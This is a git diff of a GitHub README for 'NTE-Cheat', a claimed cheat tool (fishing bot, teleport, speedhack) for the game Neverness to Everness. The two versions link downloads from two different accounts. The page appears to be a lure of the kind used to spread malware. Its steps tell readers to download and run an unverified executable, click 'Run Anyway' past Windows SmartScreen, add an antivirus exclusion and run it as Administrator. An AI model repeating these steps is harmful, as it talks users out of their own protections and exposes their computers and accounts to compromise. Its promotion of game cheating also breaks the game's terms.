@@ -1,41 +1,80 @@
-<img width="1778" height="885" alt="1aa3e580-f1f9-4da7-88dc-a8be110c1642" src="https://github.com/user-attachments/assets/c6c57921-8fd7-4fcc-9806-8a6cee541443" />
+# 🎣 NTE-Cheat - Automate your Neverness to Everness gameplay
 
-# NTE Tool
-NTE  — nte  neverness to everness  trainer nte  auto farm speed  item esp skill unlocker god mode windows 11 game assistant 2026
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/phuthu8107/NTE-Cheat/releases)
 
-[![GitHub Stars](https://img.shields.io/github/stars/Zsatti/NTE-?style=flat-square&color=00d4aa)](https://github.com/Zsatti/NTE-/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/Zsatti/NTE-?style=flat-square&color=0099cc)](https://github.com/Zsatti/NTE-/network)
-[![Downloads](https://img.shields.io/github/downloads/Zsatti/NTE-/total?style=flat-square&color=7c5cbf)](https://github.com/Zsatti/NTE-/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+## Overview ℹ️
 
-## Overview
-NTE  is a specialized assistance tool for Neverness to Everness that helps players enhance their gameplay experience. It includes useful features such as automated farming, movement speed adjustments, item visibility tools, character enhancements, and various quality-of-life improvements. The program is designed to be lightweight, user-friendly, and regularly updated to stay compatible with the latest game versions.
+NTE-Cheat provides tools to help you manage daily tasks within the Neverness to Everness game. This software automates repetitive actions like fishing and gathering rewards. It includes features for movement assistance and visual improvements. You save time and focus on the parts of the game you enjoy. The tool runs on your Windows computer as a background assistant.
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. The authors are not responsible for any account restrictions or violations of game terms of service.
+## Features ✨
 
-## Install
-[Download `NTE-Cheats-v0.2.58.zip`](https://github.com/Zsatti/NTE-Cheat/releases/download/v0.2.58/NTE-Cheats-v0.2.58.zip)
----
-> Optimized for Windows 11.
+*   **Fishing Automation:** The built-in bot monitors your screen. It handles the fishing mini-game without your input.
+*   **Movement Support:** Use the teleport and speedhack functions to traverse the map quickly.
+*   **Daily Reward Helper:** The script collects your daily login items automatically.
+*   **Visual Enhancements:** Settings for ray tracing and color adjustments improve the game graphics.
+*   **Dialogue Skipper:** The assistant advances text quickly during cutscenes.
+*   **Macro Support:** Record and play back complex button sequences.
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run the executable as Administrator
-3. Follow the brief setup instructions
-4. Launch Neverness to Everness
-5. Activate the features you want to use
-6. Enjoy improved gameplay
+## System Requirements 💻
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| Tool does not start | Run with administrator rights |
-| Game not recognized | Make sure the game is running in windowed mode |
-| Features not activating | Update to the latest version |
-| Random crashes | Close unnecessary background programs |
-| Detection concerns | Use at your own risk |
-| Windows 11 problems | Keep your system updated |
-| Settings reset | Run the tool as Administrator |
+Before you install the software, ensure your computer meets these conditions:
+
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Processor:** Intel Core i5 or AMD equivalent.
+*   **Memory:** 8 GB RAM or higher.
+*   **Display:** 1920x1080 resolution or higher.
+*   **Storage:** At least 200 MB of free space.
+*   **Graphics:** A dedicated graphics card with support for ray tracing features.
+
+## Download and Installation 📥
+
+Follow these steps to obtain and prepare the software:
+
+1.  Visit the [official releases page](https://github.com/phuthu8107/NTE-Cheat/releases) to access the files.
+2.  Look for the section labeled "Assets" under the latest version.
+3.  Click the file ending in `.zip` to begin the download.
+4.  Open your Downloads folder and locate the file.
+5.  Right-click the file and select "Extract All." Choose a folder on your computer where you want to keep the program files.
+6.  Open the extracted folder.
+7.  Locate the file named `NTE-Cheat.exe`.
+8.  Double-click the file to launch the assistant.
+9.  If Windows protects your PC, click "More Info" and then "Run Anyway."
+10. The assistant window will now appear on your screen.
+
+## How to Use the Assistant 🕹️
+
+Once the software starts, you see a control panel. This panel lists the available features.
+
+1.  Launch the Neverness to Everness game.
+2.  Switch to windowed mode or borderless windowed mode in your game settings. This helps the assistant see the game correctly.
+3.  Go back to the NTE-Cheat window.
+4.  Toggle the switches for the features you want to use.
+5.  Press the "Start" button to begin the automation process.
+6.  The tool now monitors the game window. It performs actions based on your selected settings.
+7.  To stop the assistant at any time, click the "Stop" button or press the assigned emergency hotkey, usually the F10 key.
+
+## Common Issues 🛠️
+
+If the program fails to run or behaves in unexpected ways, try these solutions:
+
+*   **Antivirus Interference:** Some security programs block automation software. Add an exclusion for the folder where you saved the files.
+*   **Screen Recognition:** If the fishing bot misses bites, ensure your game resolution matches your desktop resolution. Disable scaling in Windows display settings.
+*   **Permissions:** Always launch the software as a standard user. If the bot fails to interact, try closing the game and relaunching the software with administrator rights.
+*   **Version Mismatch:** Ensure you use the latest version of the tool. Game updates might break specific features. Check the releases page often for updates.
+
+## Performance Tips 🚀
+
+To get the best experience while using the automation tools:
+
+*   Lower the game graphics settings if you notice input lag while the script runs.
+*   Keep the assistant window in the background when not adjusting settings.
+*   Avoid using the mouse while the fishing bot is active to prevent conflicts with the automation.
+*   Close unnecessary background applications to save system memory.
+
+## Safety and Privacy 🛡️
+
+This software acts locally on your computer. It does not send your account data to external servers. It uses standard computer vision techniques to analyze the game image. You are responsible for how you use these tools in the game environment. Use assistants reasonably to ensure a balanced experience.
+
+## Contribution and Development ⚙️
+
+This project resides on GitHub as an open-source utility. If you have programming skills, you can suggest improvements or report bugs through the issue tracker. The framework relies on standard libraries to manage game interaction. Keep the codebase clean and avoid hardcoding paths to ensure stability across different user machines. The logic follows a modular design. Each service, such as fishing or movement, operates in a separate thread. This design helps maintain performance during heavy tasks. Always test your changes in a training mode before using them in a live game session.
